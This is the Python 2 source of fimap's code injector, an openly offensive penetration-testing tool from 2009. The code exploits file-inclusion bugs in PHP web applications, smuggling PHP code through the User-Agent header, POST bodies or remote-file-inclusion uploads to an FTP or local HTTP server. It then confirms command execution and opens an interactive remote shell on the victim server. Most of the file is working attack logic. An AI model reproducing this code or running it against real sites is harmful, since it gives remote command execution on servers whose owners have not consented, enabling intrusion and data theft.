import os
#
# This file is part of fimap.
#
# Copyright(c) 2009 Iman Karim(ikarim2s@smail.inf.fh-brs.de).
# http://fimap.googlecode.com
#
# This file may be licensed under the terms of of the
# GNU General Public License Version 2 (the ``GPL'').
#
# Software distributed under the License is distributed
# on an ``AS IS'' basis, WITHOUT WARRANTY OF ANY KIND, either
# express or implied. See the GPL for the specific language
# governing rights and limitations.
#
# You should have received a copy of the GPL along with this
# program. If not, go to http://www.gnu.org/licenses/gpl.html
# or write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
#

import sys
from baseClass import baseClass
from config import settings
import urllib2

__author__="Iman Karim(ikarim2s@smail.inf.fh-brs.de)"
__date__ ="$03.09.2009 03:40:49$"

shell_banner =  "-------------------------------------------\n" + \
                "Welcome to fimap shell!\n" + \
                "Better don't start interactive commands! ;)\n" +\
                "Enter 'q' to exit the shell.\n"+\
                "-------------------------------------------"


class codeinjector(baseClass):
    def _load(self):
        self.report = None

    def setReport(self, report):
        self.report = report

    def testExecutionMethods(self):
        info_payload = self.globSet.settings["php_info"][0]
        info_pattern = self.globSet.settings["php_info"][1]
        
        #for k,v in self.globSet.settings["php_exec"]

    def start(self):
        domain = self.chooseDomains()
        vuln   = self.chooseVuln(domain.getAttribute("hostname"))

        hostname = domain.getAttribute("hostname")
        mode = vuln.getAttribute("mode")
        path = vuln.getAttribute("path")
        param = vuln.getAttribute("param")
        prefix = vuln.getAttribute("prefix")
        suffix = vuln.getAttribute("suffix")
        appendix = vuln.getAttribute("appendix")
        shcode = vuln.getAttribute("file")
        paramvalue = vuln.getAttribute("paramvalue")
        payload = "%s%s%s" %(prefix, shcode, suffix)
        path = path.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))

        php_inject_works = False
        sys_inject_works = False
        working_shell    = None

        url  = "http://%s%s" %(hostname, path)

        code = None

        if (mode.find("A") != -1 and mode.find("x") != -1):
            self._log("Testing php-code injection thru User-Agent...", self.globSet.LOG_INFO)
        elif (mode.find("P") != -1 and mode.find("x") != -1):
            self._log("Testing php-code injection thru POST...", self.globSet.LOG_INFO)
        elif (mode.find("R") != -1):
            if settings["dynamic_rfi"]["mode"] == "ftp":
                self._log("Testing code thru FTP->RFI...", self.globSet.LOG_INFO)
                url  = url.replace("%s=%s"%(param, shcode), "%s=%s"%(param, settings["dynamic_rfi"]["ftp"]["http_map"]))
            elif settings["dynamic_rfi"]["mode"] == "local":
                self._log("Testing code thru LocalHTTP->RFI...", self.globSet.LOG_INFO)
                url  = url.replace("%s=%s"%(param, shcode), "%s=%s"%(param, settings["dynamic_rfi"]["local"]["http_map"]))
            else:
                print "fimap is currently not configured to exploit RFI exploits."
                sys.exit(1)

        code = self.__doHaxRequest(url, mode, settings["php_info"][0], appendix)
        if code == None:
            self._log("php-code testing failed! code=None", self.globSet.LOG_ERROR)
            sys.exit(1)


        if (code.find(settings["php_info"][1]) != -1):
            self._log("PHP Injection works! Testing if execution works...", self.globSet.LOG_ALWAYS)
            php_inject_works = True
            for item in settings["php_exec"]:
                name, payload = item
                self._log("Testing execution thru '%s'..."%(name), self.globSet.LOG_INFO)
                testload = payload.replace("__PAYLOAD__", settings["shell_test"][0])
                if (mode.find("A") != -1):
                    self.globSet.setUserAgent(testload)
                    code = self.doGetRequest(url)
                elif (mode.find("P") != -1):
                    code = self.doPostRequest(url, testload)
                elif (mode.find("R") != -1):
                    code = self.executeRFI(url, appendix, testload)

                if code != None and code.find(settings["shell_test"][1]) != -1:
                    sys_inject_works = True
                    working_shell = item
                    self._log("Execution thru '%s' works!"%(name), self.globSet.LOG_INFO)
                    break

            attack = None
            while (attack != "q"):
                attack = self.chooseAttackMode(php=php_inject_works, syst=sys_inject_works)
                

                if (type(attack) == str):
                    if (attack == "fimap_shell"):
                        cmd = ""
                        pwd_cmd = payload.replace("__PAYLOAD__", "pwd")
                        curdir = self.__doHaxRequest(url, mode, pwd_cmd, appendix).strip()
                        print shell_banner

                        while 1==1:
                            cmd = raw_input("fimap_shell:%s$> " %curdir)
                            if cmd == "q" or cmd == "quit": break
                            
                            if (cmd.strip() != ""):
                                userload = payload.replace("__PAYLOAD__", "cd '%s'; %s"%(curdir, cmd))
                                code = self.__doHaxRequest(url, mode, userload, appendix)
                                if (cmd.startswith("cd ")):
                                    cmd = "cd '%s'; %s; pwd"%(curdir, cmd)
                                    cmd = payload.replace("__PAYLOAD__", cmd)
                                    curdir = self.__doHaxRequest(url, mode, cmd , appendix).strip()
                                print code.strip()
                        print "See ya dude!"
                        sys.exit(0)
                    else:
                        print "Strange stuff..."
                else:
                    typ       = attack[0]
                    attack    = attack[1]

                    questions = attack[0]
                    payload   = attack[1]

                    if (questions != None):
                        for q, p in questions:
                            v = raw_input(q)
                            payload = payload.replace(p, v)

                    shellcode = None

                    if (typ=="php"):
                        shellcode = payload
                    elif (typ=="sys"):
                        shellcode = working_shell[1]
                        shellcode = shellcode.replace("__PAYLOAD__", payload)


                    code = self.__doHaxRequest(url, mode, shellcode, appendix)
                    if (code == None):
                        print "Exploiting Failed!"
                        sys.exit(1)
                    print code.strip()
        else:
            print "Failed to test php injection. :("


    def __doHaxRequest(self, url, m, payload, appendix=None):
        code = None
        rndStart = self.getRandomStr()
        rndEnd = self.getRandomStr()

        userload = "<? echo '%s'; ?> %s <? echo '%s'; ?>" %(rndStart, payload, rndEnd)
        if (m.find("A") != -1):
            self.globSet.setUserAgent(userload)
            code = self.doGetRequest(url)
        elif (m.find("P") != -1):
            code = self.doPostRequest(url, userload)
        elif (m.find("R") != -1):
            code = self.executeRFI(url, appendix, userload)

        if (code != None): code = code[code.find(rndStart)+len(rndStart): code.find(rndEnd)]
        return(code)

    def chooseAttackMode(self, php=True, syst=True):
        header = ""
        choose = {}
        textarr = []
        idx = 1
        
        if (syst):
            header = ":: Available Attacks - PHP and SHELL access ::"
            textarr.append("[1] Spawn fimap shell")
            choose[1] = "fimap_shell"
            idx = 2
            for k,v in settings["payloads"]["php"].items():
                textarr.append("[%d] %s"%(idx,k))
                choose[idx] = ("php", v)
                idx = idx +1

            for k,v in settings["payloads"]["sys"].items():
                textarr.append("[%d] %s"%(idx,k))
                choose[idx] = ("sys",v)
                idx = idx +1

        else:
            header = ":: Available Attacks - PHP Only ::"
            for k,v in settings["payloads"]["php"].items():
                textarr.append("[%d] %s"%(idx,k))
                choose[idx] = ("php", v)
                idx = idx +1

        textarr.append("[q] Quit")
        self.drawBox(header, textarr)
        while (1==1):
            tech = raw_input("Choose Attack: ")
            try:
                if (tech.strip() == "q"):
                    sys.exit(0)
                tech = choose[int(tech)]
                return(tech)

            except Exception, err:
                print "Invalid attack. Press 'q' to break."
        
        
    def executeRFI(self, URL, appendix, content):
        if settings["dynamic_rfi"]["mode"]=="ftp":
            up = self.FTPuploadFile(content, appendix)
            code = self.doGetRequest(URL)
            self.FTPdeleteFile(up["ftp"])
            return(code)
        elif settings["dynamic_rfi"]["mode"]=="local":
            fname = settings["dynamic_rfi"]["local"]["local_path"] + appendix
            if (os.path.exists(fname)):
                os.remove(fname)
            f = open(fname, "w")
            f.write(content)
            f.close()
            code = self.doGetRequest(URL)
            return(code)

    
    def chooseDomains(self, OnlyExploitable=True):
        choose = {}
        nodes = self.getDomainNodes()
        idx = 1
        header = ":: List of Domains ::"
        textarr = []
        for n in nodes:
            host = n.getAttribute("hostname")
            showit = False
            for child in self.getNodesOfDomain(host):
                mode = child.getAttribute("mode")
                if ("x" in mode):
                    showit = True
            if (showit or not OnlyExploitable):
                choose[idx] = n
                textarr.append("[%d] %s" %(idx, host))
                idx = idx +1

        textarr.append("[q] Quit")
        self.drawBox(header, textarr)
        
        while(1==1):
            c = raw_input("Choose Domain: ")
            if (c == "q"):
                sys.exit(0)
            try:
                c = int(c)
                ret = choose[c]
                return(ret)
            except:
                print "Invalid Domain ID."


    def chooseVuln(self, hostname):
        choose = {}
        nodes = self.getNodesOfDomain(hostname)
        doRemoteWarn = False

        idx = 1
        header = ":: FI Bugs on '" + hostname + "' ::"
        textarr = []
        for n in nodes:
            path = n.getAttribute("path")
            file = n.getAttribute("file")
            param = n.getAttribute("param")
            mode = n.getAttribute("mode")
            if (mode.find("R") != -1 and settings["dynamic_rfi"]["mode"] not in ("ftp", "local")):
                doRemoteWarn = True

            if (mode.find("x") != -1 or (mode.find("R") != -1 and settings["dynamic_rfi"]["mode"] in ("ftp", "local"))):
                choose[idx] = n
                textarr.append("[%d] URL: '%s' injecting file: '%s' using param: '%s'" %(idx, path, file, param))
                idx = idx +1

        if (idx == 1):
            if (doRemoteWarn):
                print "WARNING: Some bugs can not be used because dynamic_rfi is not configured!"
            print "This domain has no usable bugs."
            sys.exit(1)

        
        textarr.append("[q] Quit")
        self.drawBox(header, textarr)

        if (doRemoteWarn):
            print "WARNING: Some bugs are suppressed because dynamic_rfi is not configured!"

        while (1==1):
            c = raw_input("Choose vulnerable script: ")
            if (c == "q"):
                sys.exit(0)
            try:
                c = int(c)
                ret = choose[c]
                return(ret)
            except:
                print "Invalid script ID."